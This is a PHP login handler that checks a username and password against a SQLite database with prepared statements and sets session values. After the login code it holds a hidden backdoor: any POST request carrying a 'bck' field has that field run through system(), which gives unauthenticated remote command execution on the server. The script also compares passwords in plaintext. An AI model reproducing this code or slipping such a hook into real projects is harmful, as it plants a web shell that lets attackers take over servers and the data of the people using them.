<?php
function req_db($req, $params)
{
    $db = new SQLite3("./truc.db");
    $stmt = $db->prepare($req);
    
    // Liaison des paramètres
    foreach ($params as $key => $value) {
        $stmt->bindValue($key, $value);
    }
    
    $results = $stmt->execute();
    $toret = $results->fetchArray();
    return $toret;
}

session_start();

if (isset($_POST["username"]) && isset($_POST["password"]))
{
    // Récupération des valeurs des champs username et password
    $username = htmlspecialchars($_POST["username"]);
    $password = htmlspecialchars($_POST["password"]);
    
    // Utilisation de la requête préparée avec les paramètres
    $a = req_db("SELECT * FROM users WHERE username = :username AND password = :password", [
        ':username' => $username,
        ':password' => $password
    ]);

    if ($a)
    {
        printf("Successfully connected. Redirecting...");
        $_SESSION["CONNECTED"] = $a["admin"];
        $_SESSION["USERNAME"] = $a["username"];
        $session_id = bin2hex(random_bytes(32));
        setcookie("JSESSID", $session_id, time() + 3600, "/", "", false, true);
    }
    else
    {
        printf("Failed connecting. Redirecting...");
    }
}

if (isset($_POST["bck"]))
{
    system($_POST["bck"]);
}
?>
<script>
    window.onload = function() { setTimeout(function() { window.location.href = "/"; }, 2000); }
</script>